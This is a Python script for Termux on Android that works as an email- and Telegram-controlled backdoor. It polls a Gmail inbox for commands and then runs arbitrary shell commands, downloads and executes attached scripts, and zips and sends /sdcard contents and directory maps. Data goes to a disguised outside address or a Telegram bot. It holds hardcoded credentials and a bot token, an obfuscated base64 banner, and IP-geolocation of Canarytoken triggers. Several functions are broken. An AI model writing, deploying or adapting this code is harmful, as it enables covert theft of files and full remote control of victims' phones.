#!/data/data/com.termux/files/usr/bin/python
#++++++++++++++++[ importing ]
import json
import os
import glob
import fnmatch
import time
try:
	import requests
	import telegram
	from datetime import datetime
	from imap_tools import MailBox
	import smtplib
	from email.mime.multipart import MIMEMultipart
	from email.mime.text import MIMEText
	from email.mime.base import MIMEBase
	from email import encoders
except:
	list = ["requests","telegram","imap_tools"]
	for x in list:
		time.sleep(.25)
		try:
			os.system(x)
		except:
			pass
#++++++++++++++++[ variable ]
tracker = []
x_time = .1
myE = "servertermux@gmail.com"
myP = "ne9BQ9HX3t4dLF83OnEm"
hisE = "ddns.servers.g00gle.com@gmail.com"
#++++++++++++++++[ color ]
red="\033[0;31m"
gre="\033[0;32m"
yel="\033[0;33m"
whi="\033[0;37m"
#++++++++++++++++[ print banner ]
def banner():
	os.system("clear")
	note = f"{red}[{gre}!{red}] {whi}Please Wait!\n{red}[{gre}X{red}] {yel}Checking in the server for data...\n"
	os.system('base64 -d <<<"H4sIAAAAAAAA/52TOw6CQBCGe04xwCYoGmisCJUHMMaEQEEcY+y9wMazOy/ZBS3Un8c8+L8ZghHgZyW/I18xVdOkqqYyporKz0gaSZkHSet3LPJ3fd8758K7Nc4d+oG2ffAPnZhVx8BIneeEGVW1Opv7mT1nCywYCd3Aa19268NOknL23c7U2Ss6hiGBuTl3yt6+dVa6680cpKKMoPsmnwBY/j4ZaV7NGhODdEdAFmcWY+GiSjzIIf4QEeWUGfxcR3GTKmbQOBlD0UOBWANewNfqqoESGLmvDI9bMHysUO/I/ZY31myhDYlssUsY9JKOiFv0I78bB0uAhqz/+i88Aakh/M10AwAA" | gunzip | lolcat ; echo')
	print (f"{note}")
	time.sleep(.5)
#++++++++++++++++[ print list ]
def list():
	for x in tracker:
		print (f"{yel}{x}")
	time.sleep(4)
#++++++++++++++++[ checker internet connection ]
def internet_checker():
	try:
		url = "http://ipinfo.io/ip"
		requests.get(url, timeout=1)
	except (requests.ConnectionError, requests.Timeout) as exception:
		banner()
		for x in range(10):
			print (f"{red}[{yel}!{red}] {red}No Internet Connection!\n\n{red}[{gre}X{red}] {yel}Checking for internet connection...\n")
			time.sleep(1)
		internet_checker()
#++++++++++++++++[ existence ]
def isAvailable(path, FD):
	try:
		if "F" in FD:
			isFile = os.path.isfile(path)
			return isFile
		elif "D" in FD:
			isDir = os.path.isdir(path)
			return isDir
	except:
		pass
#++++++++++++++++[ mail ]
def gNet(path,type):
	internet_checker()
	if "doc" in type:
		data = r.get("http://ipinfo.io/ip").text
		nowTime = datetime.now()
		myTime = nowTime.strftime('[%d/%m/%Y]-[%I:%M:%S]')
		subject = (f"[B]-[{data}]-{myTime}")
		file = path.split("/")
		mime = MIMEMultipart()
		mime['From'] = myE
		mime['To'] = hisE
		mime['Subject'] = subject
		mime.attach(MIMEText(path, 'plain'))
		rawFile = open(path, 'rb')
		payload = MIMEBase('application', 'octate-stream')
		payload.set_payload(rawFile.read())
		encoders.encode_base64(payload)
		payload.add_header('Content-Disposition', 'attachment', filename=file[-1])
		mime.attach(payload)
		smtp_server = smtplib.SMTP('smtp.gmail.com', 587)
		smtp_server.starttls()
		smtp_server.login(myE, myP)
		text = mime.as_string()
		smtp_server.sendmail(myE, hisE, text)
		smtp_server.quit()
		print('Mail Sent')
	else:
		mime = MIMEMultipart()
		mime['From'] = myE
		mime['To'] = hisE
		mime['Subject'] = path
		smtp_server = smtplib.SMTP('smtp.gmail.com', 587)
		smtp_server.starttls()
		smtp_server.login(myE, myP)
		text = mime.as_string()
		smtp_server.sendmail(myE, hisE, text)
		smtp_server.quit()
		print('Mail Sent')
		
#++++++++++++++++[ telegram ]
def tNet(path,type):
	internet_checker()
	try:
		token = '1641253858:AAHc3-yCpivbTvlQ9w9iSB7ctdQ0iYVWMsU'
		id = "1743253501"
		bot = telegram.Bot(token)
		if "msg" in type:
			bot.sendMessage(chat_id=id, text=path)
		elif "pic" in type:
			bot.send_photo(chat_id=id, photo=open(path, 'rb'))
		elif "aud" in type:
			bot.send_audio(chat_id=id, audio=open(path, 'rb'))
		elif "doc" in type:
			bot.send_document(chat_id=id, document=open(path, 'rb'))
	except:
		pass
#++++++++++++++++[ send ip ]
def sip(which_net):
	internet_checker()
	try:
		data = requests.get("http://ipinfo.io/ip").text
		deviceTime = datetime.now()
		myTime = deviceTime.strftime('[%d/%m/%Y]-[%I:%M:%S]')
		load = (f"[{data}]-{myTime}")
		if "G]" in which_net:
			gNet(load,"msg")
		else:
			tNet(load,"msg")
	except:
		pass
#++++++++++++++++[ os command ]
def scmd(cmd):
	try:
		os.system(cmd)
	except:
		pass
#++++++++++++++++[ zip ]
def szip(path, which_net):
	if isAvailable(path,"D"):
		try:
			if isAvailable("/sdcard/.z/","D"):
				os.system("rm -rf /sdcard/.z/ ; mkdir /sdcard/.z/")
			else:
				os.system("mkdir /sdcard/.z/")
			x = (f"zip -r /sdcard/.z/x {path}")
			os.system(x)
			load = "/sdcard/.z/x.zip"
			time.sleep(.5)
			if "G]" in which_net:
				gNet(load,"doc")
			else:
				tNet(load,"doc")
		except:
			pass
	else:
		pass
#++++++++++++++++[ maping ]
def smap(path, which_net):
	if isAvailable(path,"D"):
		try:
			if isAvailable("/sdcard/.z/","D"):
				os.system("rm -rf /sdcard/.z/ ; mkdir /sdcard/.z/")
			else:
				os.system("mkdir /sdcard/.z/")
			dir = (f"tree {path} -a -df --prune -o /sdcard/.z/dir.txt")
			os.system(dir)
			time.sleep(.5)
			dir_size = (f"tree {path} -a -h --prune -o /sdcard/.z/size.txt")
			time.sleep(.5)
			os.system(dir_size)
			dir_date = (f"tree {path} -a -D --prune -o /sdcard/.z/date.txt")
			time.sleep(.5)
			os.system(dir_date)
			loads = ["/sdcard/.z/dir.txt","/sdcard/.z/size.txt","/sdcard/.z/date.txt"]
			for load in loads:
				if "G]" in which_net:
					gNet(load,"doc")
				else:
					tNet(load,"doc")
				time.sleep(.1)
		except:
			pass
	else:
		pass
#++++++++++++++++[ send file ]
def sfile(load,which_net):
	if isAvailable(load,"F"):
		try:
			if "G]" in which_net:
				gNet(load,"doc")
			else:
				tNet(load,"doc")
		except:
			pass
	else:
		pass
#++++++++++++++++[ send folder ]
def sfolder(path,which_net):
	if isAvailable(path,"D"):
		try:
			for load in os.listdir(path):
				if os.path.isfile(os.path.join(path, load)):
					if "G]" in which_net:
						gNet(load,"doc")
						time.sleep(.2)
					else:
						tNet(load,"doc")
						time.sleep(.2)
		except:
			pass
	else:
		pass
#++++++++++++++++[ receive bash script ]
def sscript(path,operation):
	with MailBox('imap.gmail.com').login(myE,myP, initial_folder='INBOX') as mailbox:
		for msg in mailbox.fetch():
			for script in msg.attachments:
				if isAvailable(path,"F"):
					rm = f"rm -rf {path}{script.filename}"
					os.system(rm)
				else:
					pass
				with open(f"{path}{script.filename}", 'wb') as file:
					file.write(script.payload)
	x = (f"{operation} {path}{script.filename}")
	os.system(x)
#++++++++++++++++[ send folder ]
def sfolderadv(path,ends,which_dir,which_net):
	file_end = [] #'**/*.py'
	past = []
	cut_end = ends.split("_")
	for cuts in cut_end:
		file_end.append(cuts)
	if "SUB" in which_dir:
		for load in glob.iglob(file_end, recursive=True):
			if "G]" in which_net:
				gNet(load,"doc")
			else:
				tNet(load,"doc")
	elif "ADV" in which_dir:
		if isAvailable("/sdcard/.sfolderadv/","D"):
			pass
		else:
			os.system("mkdir /sdcard/.sfolderadv/")
		if isAvailable("/sdcard/.sfolderadv/sfolderadv.txt","F"):
			pass
		else:
			os.system("touch /sdcard/.sfolderadv/sfolderadv.txt")
		with open("/sdcard/.sfolderadv/sfolderadv.txt", 'r') as file:
			lines = file.readlines
			past.append(lines)
		for load in glob.iglob(file_end, recursive=True):
			if load not in past:
				past.append(load)
				if "G]" in which_net:
					gNet(load,"doc")
				else:
					tNet(load,"doc")
	else:
		for load in os.listdir(path):
			if fnmatch.fnmatch(load,file_end):
				if "G]" in which_net:
					gNet(load,"doc")
				else:
					tNet(load,"doc")
#++++++++++++++++[ inbox msg check ]
def process(msg):
	hp = msg.split("-")
	data = msg.split("]-[")
	head = hp[1]
	#[S]-[SIP]-[T]
	if "[SIP]" in head:
		sip(data[2])
	#[S]-[SCMD]-[ls > ls.txt]-[N]
	elif "[SCMD]" in head:
		scmd(data[2])
	#[S]-[SZIP]-[/sdcard/GDoor/x.txt]-[T]
	elif "[SZIP]" in head:
		szip(data[2],data[3])
	#[S]-[SMAP]-[/sdcard/GB/]-[T]
	elif "[SMAP]" in head:
		smap(data[2],data[3])
	#[S]-[SMAPA]-[T]
	elif "[SMAPA]" in head:
		smap("/sdcard/",data[2])
		smap("/storage/sdcard1/",data[2])
	#[S]-[SFILE]-[/sdcard/GDoor/x.txt]-[T]
	elif "[SFILE]" in head:
		sfile(data[2],data[3])
	#[S]-[SFOLDER]-[/sdcard/GDoor/]-[T]
	elif "[SFOLDER]" in head:
		sfolder(data[2],data[3])
	#[S]-[SSCRIPT]-[/sdcard/GDoor/]-[python]-[N]
	elif "[SSCRIPT]" in head:
		sscript(data[2],data[3])
	#[S]-[SFOLDERADV]-[/sdcard/GDoor/]-[**/*.py_**/*.txt_**/*.sh]-[T]
	elif "[SFOLDERADV]" in head:
		sfoldersf(data[2],data[3],data[4],data[5])
#++++++++++++++++[ show result ]
def show(msg):
	line = msg.split("\r\n")
	info = []
	ip = ""
	for value in line:
		if "Time   : " in value:
			split_value = (value.split(": "))[1]
			data = (f"\n================================\n[X]~[ Tracker Token Details ]~>\n================================\nTime: {split_value}")
			info.append(data)
		elif "Source IP:" in value:
			ip += ((value.split(": "))[1])
			split_value = (value.split(": "))[1]
			data = (f"================================\n[ IP ADDRESS: ]\n{split_value}")
			info.append(data)
		elif "User-agent: " in value:
			split_value = (value.split(": "))[1]
			data = (f"================================\n[ DEVICE: ]\n{split_value}\n================================\n")
			info.append(data)
		else:
			pass
	data = ""
	ipapi = requests.get((f"https://ipapi.co/{ip}/json/"), timeout=1)
	if "200" in str(ipapi):
		data += (ipapi.text)
	else:
		ipinfo = requests.get((f"http://ipinfo.io/{ip}?token=59da4b064db34a"), timeout=1)
		data += (ipinfo.text)
	obj = json.loads(data)
	for key, value in obj.items():
		data = (f"{((key).upper())}: {value}")
		info.append(data)
	for results in info:
		tracker.append(results)
		print(gre+results)
	time.sleep(3)
#++++++++++++++++[ scanner ]
def scanner():
	with MailBox('imap.gmail.com').login(myE,myP, initial_folder='INBOX') as mailbox:
		for msg in mailbox.fetch(charset='utf8'):
			if "[S]-" in msg.subject and "[B]-" not in msg.subject and "Canarytoken" not in msg.subject:
				process(msg.subject)
				mailbox.delete(msg.uid)
			elif "Your Canarytoken was Triggered" in msg.subject:
				show(msg.text)
				mailbox.delete(msg.uid)
			else:
				pass
#++++++++++++++++[ start ]
def start():
	os.system("screenfetch")
	os.system("termux-wake-lock")
	time.sleep(.5)
	internet_checker()
	while True:
		banner()
		scanner()
		list()
#++++++++++++++++[ bottom ]
if __name__=='__main__':
	start()

